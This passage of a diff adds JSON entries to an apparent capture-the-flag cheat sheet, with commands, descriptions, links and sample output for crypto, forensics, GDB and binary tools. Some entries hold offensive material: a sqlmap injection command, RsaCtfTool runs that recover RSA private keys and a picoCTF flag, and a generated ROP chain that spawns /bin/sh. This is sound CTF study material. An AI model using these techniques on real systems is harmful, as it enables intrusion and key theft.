+      "https://sourceware.org/gdb/onlinedocs/gdb/Dump_002fRestore-Files.html"
+    ],
+    [
+      "Crypto",
+      "Ciphers",
+      "0",
+      "No",
+      "\u003csolve substitution cipher\u003e",
+      "Solve substitution ciphers.",
+      "https://www.guballa.de/substitution-solver"
+    ],
+    [
+      "Crypto",
+      "Ciphers",
+      "0",
+      "No",
+      "\u003csolve Vigenere cipher\u003e",
+      "Solve Vigenere ciphers.",
+      "https://www.guballa.de/vigenere-solver"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "{ echo \"name\"; echo 'a_reAllY_s3cuRe_p4s$word_56b977';} | cat",
+      "Echo two lines by including them in curly brackets. No need to escape the dollar sign since string is enclosed within single quotes.\nOutput piped to cat.",
+      "",
+      "# { echo \"name\"; echo 'a_reAllY_s3cuRe_p4s$word_56b977';} | cat\nname\na_reAllY_s3cuRe_p4s$word_56b977\n# { echo \"name\"; echo \"a_reAllY_s3cuRe_p4s$word_56b977\";} | cat\nname\na_reAllY_s3cuRe_p4s"
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "0",
+      "No",
+      "ksv \u003cbinary\u003e \u003cKaitai-format-file\u003e",
+      "Visualize a binary format using Kaitai.",
+      "http://formats.kaitai.io/\nhttps://github.com/kaitai-io/kaitai_struct_formats\nhttps://ide.kaitai.io/",
+      "# wget https://dl.bintray.com/kaitai-io/universal/0.8/kaitai-struct-compiler-0.8.zip\n# unzip kaitai-struct-compiler-0.8.zip\n# git clone https://github.com/kaitai-io/kaitai_struct_formats.git\n# PATH=$PATH:~/utils/kaitai-struct-compiler-0.8/bin\n# ksv /path/to/nowYouDont.png ~/utils/kaitai_struct_formats/image/png.ksy\n[-] [root]                                                                               00000000: 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 | .PNG........IHDR\n  [.] magic = 89 50 4e 47 0d 0a 1a 0a                                                    00000010: 00 00 03 59 00 00 02 bf 08 06 00 00 00 9b 6b 07 | ...Y..........k.\n  [.] ihdr_len = 00 00 00 0d                                                             00000020: 18 00 00 00 01 73 52 47 42 00 ae ce 1c e9 00 00 | .....sRGB.......\n  [.] ihdr_type = 49 48 44 52                                                            00000030: 3f a6 49 44 41 54 78 01 ed dc 8d b2 e3 38 6e 06 | ?.IDATx......8n.\n  [-] ihdr                                                                               00000040: d0 dd 54 1e 64 5f 39 4f 9c 2c 77 c2 6a 96 46 d4 | ..T.d_9O.,w.j.F.\n    [.] width = 857                                                                      00000050: 8f 05 c8 92 71 ba 6a ca be b2 04 12 07 1c 77 7f | ....q.j.......w.\n    [.] height = 703                                                                     00000060: e9 c9 fe f3 7f fe f5 af ff fd 87 5f 04 08 10 20 | ..........._... \n    [.] bit_depth = 8                                                                    00000070: 40 80 00 01 02 04 08 10 20 10 22 f0 5f 21 55 14 | @....... .\"._!U.\n    [.] color_type = color_type_truecolor_alpha                                          00000080: 21 40 80 00 01 02 04 08 10 20 40 80 00 81 ff 08 | !@....... @.....\n    [.] compression_method = 0                                                           00000090: 08 59 0e 02 01 02 04 08 10 20 40 80 00 01 02 04 | .Y....... @.....\n    [.] filter_method = 0                                                                000000a0: 02 05 84 ac 40 4c a5 08 10 20 40 80 00 01 02 04 | ....@L... @.....\n    [.] interlace_method = 0                                                             000000b0: 08 10 20 20 64 39 03 04 08 10 20 40 80 00 01 02 | ..  d9.... @....\n  [.] ihdr_crc = 9b 6b 07 18                                                             000000c0: 04 08 10 08 14 10 b2 02 31 95 22 40 80 00 01 02 | ........1.\"@....\n  [-] chunks (3 = 0x3 entries)                                                           000000d0: 04 08 10 20 40 80 80 90 e5 0c 10 20 40 80 00 01 | ... @...... @...\n    [-] 0                                                                                000000e0: 02 04 08 10 20 40 20 50 40 c8 0a c4 54 8a 00 01 | .... @ P@...T...\n      [.] len = 1                                                                        000000f0: 02 04 08 10 20 40 80 00 01 02 42 96 33 40 80 00 | .... @....B.3@..\n      [.] type = \"sRGB\"                                                                  00000100: 01 02 04 08 10 20 40 80 00 81 40 01 21 2b 10 53 | ..... @...@.!+.S\n      [+] body                                                                           00000110: 29 02 04 08 10 20 40 80 00 01 02 04 08 08 59 ce | ).... @.......Y.\n      [.] crc = ae ce 1c e9                                                              00000120: 00 01 02 04 08 10 20 40 80 00 01 02 04 02 05 84 | ...... @........\n    [-] 1                                                                                00000130: ac 40 4c a5 08 10 20 40 80 00 01 02 04 08 10 20 | .@L... @....... \n      [.] len = 16294                                                                    00000140: 20 64 39 03 04 08 10 20 40 80 00 01 02 04 08 10 |  d9.... @.......\n      [.] type = \"IDAT\"                                                                  00000150: 08 14 10 b2 02 31 95 22 40 80 00 01 02 04 08 10 | .....1.\"@.......\n      [.] body = 78 01 ed dc 8d b2 e3 38 6e 06 d0 dd 54 1e 64 5f 39 4f 9c 2c 77 c2 6a 96…00000160: 20 40 80 80 90 e5 0c 10 20 40 80 00 01 02 04 08 |  @...... @......\n      [.] crc = 89 de 79 ad                                                              00000170: 10 20 40 20 50 40 c8 0a c4 54 8a 00 01 02 04 08 | . @ P@...T......\n    [-] 2                                                                                00000180: 10 20 40 80 00 01 02 42 96 33 40 80 00 01 02 04 | . @....B.3@.....\n      [.] len = 0                                                                        00000190: 08 10 20 40 80 00 81 40 01 21 2b 10 53 29 02 04 | .. @...@.!+.S)..\n      [.] type = \"IEND\"                                                                  000001a0: 08 10 20 40 80 00 01 02 04 08 08 59 ce 00 01 02 | .. @.......Y....\n      [.] body =                                                                         000001b0: 04 08 10 20 40 80 00 01 02 04 02 05 84 ac 40 4c | ... @.........@L\n      [.] crc = ae 42 60 82                                                              000001c0: a5 08 10 20 40 80 00 01 02 04 08 10 20 20 64 39 | ... @.......  d9\n"
+    ],
+    [
+      "Forensics",
+      "Steganography",
+      "0",
+      "No",
+      "\u003creveal hidden text with GIMP\u003e",
+      "Reveal hidden text in an image.\n1. Open the image with GIMP.\n2. Mode: Grain Extract.\n3. Filters -\u003e Enhance -\u003e Unsharp Mask -\u003e Amout: ~10.0",
+      "https://www.wikihow.com/Create-Hidden-Watermarks-in-GIMP"
+    ],
+    [
+      "Forensics",
+      "Steganography",
+      "0",
+      "No",
+      "\u003creveal hidden text with StegSolve\u003e",
+      "Reveal hidden text in an image.\n1. Open image with StegSolve.\n2. Browse the different filters.",
+      "http://www.caesum.com/handbook/stego.htm\nhttps://medium.com/@FourOctets/ctf-tidbits-part-1-steganography-ea76cc526b40"
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "0",
+      "No",
+      "dd skip=\u003cstart_offset\u003e count=\u003ccount\u003e if=\u003cinput_file\u003e of=\u003coutput_file\u003e bs=1",
+      "Extract bytes from binary file.\nUse $((\u003chex_value\u003e)) for specifying offsets in hex.",
+      "https://stackoverflow.com/questions/1423346/how-do-i-extract-a-single-chunk-of-bytes-from-within-a-file",
+      "# dd skip=$((0x858)) count=25 if=main of=out.bin bs=1\n25+0 records in\n25+0 records out\n25 bytes copied, 0.00880228 s, 2.8 kB/s\n# xxd out.bin \n00000000: 2906 164f 2b35 301e 511b 5b14 4b08 5d2b  )..O+50.Q.[.K.]+\n00000010: 5c10 0606 1845 5100 5d                   \\....EQ.]\n"
+    ],
+    [
+      "Network",
+      "Transfer Files",
+      "10",
+      "No",
+      "scp username@from_host:file.txt /local/directory/",
+      "Copy file from a remote host to local host.",
+      "https://haydenjames.io/linux-securely-copy-files-using-scp/"
+    ],
+    [
+      "Network",
+      "Transfer Files",
+      "20",
+      "No",
+      "scp file.txt username@to_host:/remote/directory/",
+      "Copy file from local host to a remote host.",
+      "https://haydenjames.io/linux-securely-copy-files-using-scp/"
+    ],
+    [
+      "Forensics",
+      "File Systems",
+      "0",
+      "No",
+      "debugfs \u003cfile_system\u003e",
+      "Simple-to-use RAM-based file system specially designed for debugging purposes.",
+      "https://lwn.net/Articles/334546/\nhttps://www.cs.montana.edu/courses/309/topics/4-disks/debugfs_example.html",
+      "# debugfs ext-super-magic.img\ndebugfs 1.44.1 (24-Mar-2018)\ndebugfs:  ls\n 2  (12) .    2  (1012) ..    26  (24) filler-348.jpg   \n 84  (24) filler-303.jpg    103  (24) filler-18.jpg   \n 107  (24) filler-434.jpg    169  (20) filler-6.jpg    182  (16) flag.jpg\ndebugfs:  dump flag.jpg flag.jpg\ndebugfs:  q"
+    ],
+    [
+      "SQL",
+      "sqlmap",
+      "60",
+      "No",
+      "sqlmap.py -u \u003curl\u003e --method POST --data \u003cdate\u003e -p \u003cfield_to_attack\u003e",
+      "Automate the process of detecting and exploiting SQL injection flaws using a POST form.",
+      "http://sqlmap.org/\nhttp://carnal0wnage.attackresearch.com/2011/03/sqlmap-with-post-requests.html",
+      "sqlmap.py -u \"http://www.example.com/login.php\" --method POST --data \"username=1&password=1\" -p \"username\""
+    ],
+    [
+      "Executables",
+      "libc",
+      "0",
+      "No",
+      "/path/to/libc-database/find \u003cfunction1\u003e \u003coffset1\u003e \u003cfunction 2\u003e \u003coffset 2\u003e ... \u003cfunction x\u003e \u003coffset x\u003e",
+      "Given several function offsets, find the correct libc version that matches them.",
+      "https://github.com/niklasb/libc-database\nhttps://libc.blukat.me/",
+      "# ./find fflush 330 read 350 write 3c0 puts 140\nubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)"
+    ],
+    [
+      "Crypto",
+      "RSA",
+      "20",
+      "No",
+      "RsaCtfTool.py --createpub  --e \u003ce\u003e --n \u003cn\u003e",
+      "Create public key from parameters.",
+      "https://github.com/Ganapati/RsaCtfTool",
+      "# ~/utils/RsaCtfTool/RsaCtfTool.py --createpub  --e 65537 --n 17532198692854411415028847656413722571491747286511164929799451334161425747170211\n-----BEGIN PUBLIC KEY-----\nMD0wDQYJKoZIhvcNAQEBBQADLAAwKQIiAJdpOM6KGHQgffwd/hQo5oBfTDPSQczr\n3GuKNq1pMthTowIDAQAB\n-----END PUBLIC KEY-----"
+    ],
+    [
+      "Crypto",
+      "RSA",
+      "30",
+      "No",
+      "RsaCtfTool.py --publickey \"\u003cwildcard\u003e\" --private --verbose",
+      "Attempt to break multiple public keys with common factor attacks or individually.",
+      "https://github.com/Ganapati/RsaCtfTool",
+      "RsaCtfTool.py --publickey \"*.pub\" --private --verbose\n[*] Multikey mode using keys: ['key.pub', 'key2.pub', 'key3.pub']\n[*] Performing hastads attack.\n[*] Performing factordb attack.\n-----BEGIN RSA PRIVATE KEY-----\nMIGrAgEAAiFtX1bZZ3KdEyhmBMtd1k4Ea3Dynq5kcG5XT+TZy1mqBr0CAwEAAQIh\nVtPlYtqZRtG6tKMBwBEuBbUr/lzcBFXJdkr6330TPMaRAhBgVZfvVcc+dukkHQqH\n37E7AhIBIqXDf/lUNQlR2DZSyYFhqGcCEFUptgymZ2LIWqlLZzDhR1sCEUrVd1K5\n9Y56SdJrmkE7yNM9AhAQ0eaJjw39ifHiZ2kiqoPl\n-----END RSA PRIVATE KEY-----\n[*] Performing hastads attack.\n[*] Performing factordb attack.\n-----BEGIN RSA PRIVATE KEY-----\nMIGrAgEAAiFWoQD9JGaz/ntBwjkwCKVeVHpIQkgGd1ubFZOIfvBZx60CAwEAAQIh\nCpPKDR6es6eE4TiXxvenSUb/GI3yek8NnqaOiAwRWxA5AhBUBngUj3VVlxCe7D38\ndKpjAhIBB+67tcHSMzq/fKG7VK3L2q8CD22gAwrQIEWK0iSGFFlL3QISALDphCcT\n8SrnsR0AZ8od6Ov/AhAoRj5xLXK7XPDaaboMIUZU\n-----END RSA PRIVATE KEY-----\n[*] Performing hastads attack.\n[*] Performing factordb attack.\n[*] Performing pastctfprimes attack.\n[*] Loaded 71 primes\n[*] Performing noveltyprimes attack.\n[*] Performing smallq attack.\n[*] Performing wiener attack.\n[*] Performing comfact_cn attack.\n[*] Performing fermat attack.\n[*] Performing siqs attack.\n[*] Performing hastads attack.\n[*] Performing factordb attack.\n-----BEGIN RSA PRIVATE KEY-----\nMIGrAgEAAiF3qN3KV9dZP9qbwMSjkA7vOS0lJF8fYSSdRz5pT0xGRI0CAwEAAQIh\nHdske7gvIzWrdfFDHwxyrTyk9jLiiLaRpAhmhfltlMiBAhB1q1q6RGrPnvTH6/rN\nxsiLAhIBBFR869MDpkOLMLtmSSqcskcCEGxmPSCXYqZ90xZRqCzlUV0CESDJe0pA\nM093Zkpm78T7Ruz1AhAWodWHI4lyb2YAmqVTEQ7g\n-----END RSA PRIVATE KEY-----\n"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl rsa -in \u003cprivate_key_file\u003e -text",
+      "Examine RSA private key.\n\nmodulus: N [p * q]\npublicExponent: e\nprivateExponent: d\nprime1: p\nprime2: q\nexponent1: dp [d (mod p-1)]\nexponent2: dq [d (mod q-1)]\ncoefficient: qInv [q^-1 (mod p)]",
+      "https://linux.die.net/man/1/rsa",
+      "# openssl rsa -in key_a.priv -text\nPrivate-Key: (264 bit)\nmodulus:\n    00:81:92:d4:9b:fc:7d:5b:cd:69:16:ef:0a:f4:0f:\n    b9:df:9b:9b:b5:6b:d7:51:e9:6b:9f:3a:8f:48:3b:\n    b2:fe:e1:a1\npublicExponent: 65537 (0x10001)\nprivateExponent:\n    6b:b6:73:a7:78:2d:7d:b3:34:39:2c:5e:1e:a5:34:\n    0d:8f:76:38:67:a3:c7:75:ed:9e:ee:e9:8d:8f:60:\n    68:98:41\nprime1:\n    4b:2e:08:de:a8:b0:ac:b5:82:8f:15:d8:a6:34:9d:\n    d3\nprime2:\n    01:b9:38:48:64:91:70:2f:d9:a7:cc:8f:a9:e3:05:\n    9c:36:3b\nexponent1:\n    16:f9:d9:b2:1a:c1:eb:f6:89:11:2b:af:0b:94:97:\n    0b\nexponent2:\n    06:ad:b3:6a:d2:48:c0:70:aa:f9:8d:b3:24:9c:91:\n    20:c1\ncoefficient:\n    12:a1:df:8c:13:0a:70:1c:17:cc:09:14:33:3b:60:\n    69\nwriting RSA key\n-----BEGIN RSA PRIVATE KEY-----\nMIGsAgEAAiIAgZLUm/x9W81pFu8K9A+535ubtWvXUelrnzqPSDuy/uGhAgMBAAEC\nIWu2c6d4LX2zNDksXh6lNA2Pdjhno8d17Z7u6Y2PYGiYQQIQSy4I3qiwrLWCjxXY\npjSd0wISAbk4SGSRcC/Zp8yPqeMFnDY7AhAW+dmyGsHr9okRK68LlJcLAhEGrbNq\n0kjAcKr5jbMknJEgwQIQEqHfjBMKcBwXzAkUMztgaQ==\n-----END RSA PRIVATE KEY-----"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl rsa -pubin -in \u003cpublic_key_file\u003e -text",
+      "Examine RSA public key.\n\nmodulus: N\nexponent: e",
+      "https://linux.die.net/man/1/rsa",
+      "# openssl rsa -pubin -in key.pub -text\nPublic-Key: (263 bit)\nModulus:\n    6d:5f:56:d9:67:72:9d:13:28:66:04:cb:5d:d6:4e:\n    04:6b:70:f2:9e:ae:64:70:6e:57:4f:e4:d9:cb:59:\n    aa:06:bd\nExponent: 65537 (0x10001)\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhbV9W2WdynRMoZgTLXdZOBGtw8p6uZHBu\nV0/k2ctZqga9AgMBAAE=\n-----END PUBLIC KEY-----"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "echo '\u003chex_string\u003e' | awk '{ print (length($0) % 2 == 0) ? $0 : 0$0; }' | xxd -p -r \u003e \u003coutput_file\u003e",
+      "Create a binary file from a hex string.",
+      "https://www.systutorials.com/docs/linux/man/1-xxd/",
+      "# echo '00112233445566778899aabbccddeeff' | awk '{ print (length($0) % 2 == 0) ? $0 : 0$0; }' | xxd -p -r \u003e out.bin\n# xxd -g1 out.bin \n00000000: 00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff  ..\"3DUfw........"
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "0",
+      "No",
+      "xxd -g1 \u003cbinary_file\u003e",
+      "Command line hex viewer.\n\nThe \"-g\" flag controls the number of bytes to group by.",
+      "https://www.systutorials.com/docs/linux/man/1-xxd/",
+      "# xxd -g1 key_a.pub \n00000000: 2d 2d 2d 2d 2d 42 45 47 49 4e 20 50 55 42 4c 49  -----BEGIN PUBLI\n00000010: 43 20 4b 45 59 2d 2d 2d 2d 2d 0a 4d 44 30 77 44  C KEY-----.MD0wD\n00000020: 51 59 4a 4b 6f 5a 49 68 76 63 4e 41 51 45 42 42  QYJKoZIhvcNAQEBB\n00000030: 51 41 44 4c 41 41 77 4b 51 49 69 41 49 47 53 31  QADLAAwKQIiAIGS1\n00000040: 4a 76 38 66 56 76 4e 61 52 62 76 43 76 51 50 75  Jv8fVvNaRbvCvQPu\n00000050: 64 2b 62 6d 37 56 72 31 31 48 70 0a 61 35 38 36  d+bm7Vr11Hp.a586\n00000060: 6a 30 67 37 73 76 37 68 6f 51 49 44 41 51 41 42  j0g7sv7hoQIDAQAB\n00000070: 0a 2d 2d 2d 2d 2d 45 4e 44 20 50 55 42 4c 49 43  .-----END PUBLIC\n00000080: 20 4b 45 59 2d 2d 2d 2d 2d 0a                     KEY-----."
+    ],
+    [
+      "Crypto",
+      "RSA",
+      "0",
+      "No",
+      "\u003cfactorize large numbers - factordb\u003e",
+      "See link.",
+      "http://factordb.com"
+    ],
+    [
+      "Crypto",
+      "RSA",
+      "0",
+      "No",
+      "\u003cfactorize large numbers - alpertron\u003e",
+      "See link.",
+      "https://www.alpertron.com.ar/ECM.HTM"
+    ],
+    [
+      "GDB",
+      "Settings",
+      "",
+      "No",
+      "set disassembly-flavor intel",
+      "Set disassemmbly syntax to Intel style.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Machine-Code.html",
+      "(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   %rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    %rsp,%rbp\n   0x000000000040053a \u003c+4\u003e:     sub    $0x10,%rsp\n   0x000000000040053e \u003c+8\u003e:     mov    %rdi,-0x8(%rbp)\n   0x0000000000400542 \u003c+12\u003e:    mov    %esi,-0xc(%rbp)\n   0x0000000000400545 \u003c+15\u003e:    mov    %edx,-0x10(%rbp)\n=\u003e 0x0000000000400548 \u003c+18\u003e:    mov    -0x10(%rbp),%edx\n   0x000000000040054b \u003c+21\u003e:    mov    -0xc(%rbp),%ecx\n   0x000000000040054e \u003c+24\u003e:    mov    -0x8(%rbp),%rax\n   0x0000000000400552 \u003c+28\u003e:    mov    %ecx,%esi\n   0x0000000000400554 \u003c+30\u003e:    mov    %rax,%rdi\n   0x0000000000400557 \u003c+33\u003e:    mov    $0x0,%eax\n   0x000000000040055c \u003c+38\u003e:    callq  0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leaveq\n   0x0000000000400563 \u003c+45\u003e:    retq\nEnd of assembler dump.\n(gdb) set disassembly-flavor intel\n(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    rbp,rsp\n   0x000000000040053a \u003c+4\u003e:     sub    rsp,0x10\n   0x000000000040053e \u003c+8\u003e:     mov    QWORD PTR [rbp-0x8],rdi\n   0x0000000000400542 \u003c+12\u003e:    mov    DWORD PTR [rbp-0xc],esi\n   0x0000000000400545 \u003c+15\u003e:    mov    DWORD PTR [rbp-0x10],edx\n   0x0000000000400548 \u003c+18\u003e:    mov    edx,DWORD PTR [rbp-0x10]\n   0x000000000040054b \u003c+21\u003e:    mov    ecx,DWORD PTR [rbp-0xc]\n   0x000000000040054e \u003c+24\u003e:    mov    rax,QWORD PTR [rbp-0x8]\n=\u003e 0x0000000000400552 \u003c+28\u003e:    mov    esi,ecx\n   0x0000000000400554 \u003c+30\u003e:    mov    rdi,rax\n   0x0000000000400557 \u003c+33\u003e:    mov    eax,0x0\n   0x000000000040055c \u003c+38\u003e:    call   0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leave\n   0x0000000000400563 \u003c+45\u003e:    ret\nEnd of assembler dump. "
+    ],
+    [
+      "GDB",
+      "Settings",
+      "",
+      "No",
+      "display/i $pc",
+      "Display the machine instruction about to be executed each time execution stops.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Auto-Display.html#Auto-Display",
+      "(gdb) display /i $pc\n(gdb) r\nStarting program: /home/a.out\n                             \nBreakpoint 1, sum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);\n1: x/i $pc                                  \n=\u003e 0x400572 \u003csum+14\u003e:   mov    edx,DWORD PTR [rbp-0x8]"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "echo \"obase=16; \u003cdecimal_number\u003e\" | BC_LINE_LENGTH=0 bc | awk '{ print (length($0) % 2 == 0) ? $0 : 0$0; }'",
+      "Convert decimal number to zero-padded hex representation.",
+      "",
+      "# c=2183401215768347975982101992228604468411620601086085547858868939369414945999602889033372054100523890136308156886652903511569068793968789436056808171858300546699245807591573364889074178479161669770155590854814397625730610531181053834384350322193768425398011726280564547833528644155359703244180720004794304017\n# echo \"obase=16; $c\" | BC_LINE_LENGTH=0 bc | awk '{ print (length($0) % 2 == 0) ? $0 : 0$0; }'\n031BF8E45557C97499462F7C6D9D58AC5C948B1AC603782566EDA0315E57DA5EBF83EB19D9337F9A73E0C6B1954F1283C79F6193EC396F2F6D4F7F02E8E148126813E4DD622B8FB721C2E040EBF727974EA3AE54CD658DF3EAC7C6B9049EFC3D71143AEB1998B432FF16B96A02A46A8CA3913A5963AC3030F60564132D424611"
+    ],
+    [
+      "Crypto",
+      "RSA",
+      "40",
+      "No",
+      "RsaCtfTool.py --publickey \u003cpublic_key_file\u003e --private --uncipher \u003cciphertext_file\u003e",
+      "Decrypt binary file by attacking public key.",
+      "https://github.com/Ganapati/RsaCtfTool",
+      "# c=2183401215768347975982101992228604468411620601086085547858868939369414945999602889033372054100523890136308156886652903511569068793968789436056808171858300546699245807591573364889074178479161669770155590854814397625730610531181053834384350322193768425398011726280564547833528644155359703244180720004794304017\n\n# echo \"obase=16; $c\" | BC_LINE_LENGTH=0 bc | awk '{ print (length($0) % 2 == 0) ? $0 : 0$0; }' | xxd -p -r \u003e c.bin\n\n# xxd c.bin \n00000000: 031b f8e4 5557 c974 9946 2f7c 6d9d 58ac  ....UW.t.F/|m.X.\n00000010: 5c94 8b1a c603 7825 66ed a031 5e57 da5e  \\.....x%f..1^W.^\n00000020: bf83 eb19 d933 7f9a 73e0 c6b1 954f 1283  .....3..s....O..\n00000030: c79f 6193 ec39 6f2f 6d4f 7f02 e8e1 4812  ..a..9o/mO....H.\n00000040: 6813 e4dd 622b 8fb7 21c2 e040 ebf7 2797  h...b+..!..@..'.\n00000050: 4ea3 ae54 cd65 8df3 eac7 c6b9 049e fc3d  N..T.e.........=\n00000060: 7114 3aeb 1998 b432 ff16 b96a 02a4 6a8c  q.:....2...j..j.\n00000070: a391 3a59 63ac 3030 f605 6413 2d42 4611  ..:Yc.00..d.-BF.\n\n# RsaCtfTool.py --publickey key.pub --private --uncipher c.bin \n\n-----BEGIN RSA PRIVATE KEY-----\nMIIB4AIBAAKBgFcUuXVyk6yC7vkXls2XRFqonsgjniMY99qLXd0gszK4dP9Hyze4\naE2WEJSwf+8VgN44iRT6370uqTHDwXgMg1wYZ71S3bFi/ECMdfxYHIc/8OcP65i4\nnc5mb6tODuu3JXzlyDbUExtwbNpLu1j+YkOpY2YzJSOFcDfZCnatdsvrAoGAJpfL\nvc6CviDlMkYPEpyosZkrjb2jVyC4sAW2GstkP+VaDM1PtiknKMOKI6u5d0dLbrEV\np9Orlxd36tM8Ci1ZhdH9HugYIiRcLfAmUjiMP4VCehN4PN00eZzWLfSyvqqiV8So\nMRu41brahnDjzwbKg+n+noYR2d7ZJEDbMr5GIIECAwEAAQJBAJOt5JtaaCSri1IB\ng0P0dgTF1CIMuSfPyqNbF2nxSmVOEYBoHzRxw+D9Wr2tGv9vj3YAOj5WvcKtr9wj\npdadmkECQQCW9CJEW9d+3ZG21abggLwREHG0o51MfDJgRPxK/ErwpoHxJY1nkwP0\nTLdKWFCkDeN7nNhpdr5jJYBvNIpVJyMrAgMBAAECAwEAAQJALWlLDddEEs3jtPi+\nDzrYnm3YCNx27zduSdO+HqN0RKf94Vu9c8jE1s7rDiHy0qij0smN5VmsRhrXT4a1\nZ34waQ==\n-----END RSA PRIVATE KEY-----\n[+] Clear text : picoCTF{w@tch_y0ur_Xp0n3nt$_c@r3fu11y_4137999}"
+    ],
+    [
+      "Executables",
+      "Exploit",
+      "0",
+      "No",
+      "ROPgadget --binary \u003cbinary\u003e --ropchain",
+      "Create a ROP gadget for a given binary.",
+      "https://github.com/JonathanSalwan/ROPgadget",
+      "# ROPgadget --binary ./gets --ropchain\n\nGadgets information\n============================================================\n0x080aa3f8 : aaa ; add esp, 4 ; pop ebx ; pop esi ; ret\n0x0806cd68 : aaa ; lea esp, dword ptr [ebp - 0xc] ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080b8329 : aaa ; push 1 ; push 1 ; call eax\n0x080b8792 : aaa ; push dword ptr [esp + 0xc] ; mov eax, dword ptr [esp + 0x14] ; call eax\n0x080b7d51 : aaa ; push ecx ; push 1 ; call eax\n...\n0x080709b4 : xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x807099f\n0x08080efb : xor edx, edx ; div esi ; add eax, ebx ; pop ebx ; pop esi ; ret\n0x0808aea0 : xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x08071ba1 : xor edx, edx ; mov eax, edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x080847e5 : xor esi, dword ptr [ecx] ; jmp 0x8083739\n0x080b9ff3 : xor esi, esi ; pop ebx ; mov eax, esi ; pop esi ; pop edi ; pop ebp ; ret\n0x0808e10c : xor esi, esi ; ret 0xf01\n\nUnique gadgets found: 11741\n\nROP chain generation\n===========================================================\n\n- Step 1 -- Write-what-where gadgets\n\n\t[+] Gadget found: 0x8051035 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret\n\t[+] Gadget found: 0x8048433 pop esi ; ret\n\t[+] Gadget found: 0x8048480 pop edi ; ret\n\t[-] Can't find the 'xor edi, edi' gadget. Try with another 'mov [r], r'\n\n\t[+] Gadget found: 0x80549db mov dword ptr [edx], eax ; ret\n\t[+] Gadget found: 0x806f02a pop edx ; ret\n\t[+] Gadget found: 0x80b81c6 pop eax ; ret\n\t[+] Gadget found: 0x8049303 xor eax, eax ; ret\n\n- Step 2 -- Init syscall number gadgets\n\n\t[+] Gadget found: 0x8049303 xor eax, eax ; ret\n\t[+] Gadget found: 0x807a86f inc eax ; ret\n\n- Step 3 -- Init syscall arguments gadgets\n\n\t[+] Gadget found: 0x80481c9 pop ebx ; ret\n\t[+] Gadget found: 0x80de955 pop ecx ; ret\n\t[+] Gadget found: 0x806f02a pop edx ; ret\n\n- Step 4 -- Syscall gadget\n\n\t[+] Gadget found: 0x806cc25 int 0x80\n\n- Step 5 -- Build the ROP chain\n\n\t#!/usr/bin/env python2\n\t# execve generated by ROPgadget\n\n\tfrom struct import pack\n\n\t# Padding goes here\n\tp = ''\n\n\tp += pack('\u003cI', 0x0806f02a) # pop edx ; ret\n\tp += pack('\u003cI', 0x080ea060) # @ .data\n\tp += pack('\u003cI', 0x080b81c6) # pop eax ; ret\n\tp += '/bin'\n\tp += pack('\u003cI', 0x080549db) # mov dword ptr [edx], eax ; ret\n\tp += pack('\u003cI', 0x0806f02a) # pop edx ; ret\n\tp += pack('\u003cI', 0x080ea064) # @ .data + 4\n\tp += pack('\u003cI', 0x080b81c6) # pop eax ; ret\n\tp += '//sh'\n\tp += pack('\u003cI', 0x080549db) # mov dword ptr [edx], eax ; ret\n\tp += pack('\u003cI', 0x0806f02a) # pop edx ; ret\n\tp += pack('\u003cI', 0x080ea068) # @ .data + 8\n\tp += pack('\u003cI', 0x08049303) # xor eax, eax ; ret\n\tp += pack('\u003cI', 0x080549db) # mov dword ptr [edx], eax ; ret\n\tp += pack('\u003cI', 0x080481c9) # pop ebx ; ret\n\tp += pack('\u003cI', 0x080ea060) # @ .data\n\tp += pack('\u003cI', 0x080de955) # pop ecx ; ret\n\tp += pack('\u003cI', 0x080ea068) # @ .data + 8\n\tp += pack('\u003cI', 0x0806f02a) # pop edx ; ret\n\tp += pack('\u003cI', 0x080ea068) # @ .data + 8\n\tp += pack('\u003cI', 0x08049303) # xor eax, eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0807a86f) # inc eax ; ret\n\tp += pack('\u003cI', 0x0806cc25) # int 0x80\n"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "180",
+      "No",
+      "until",
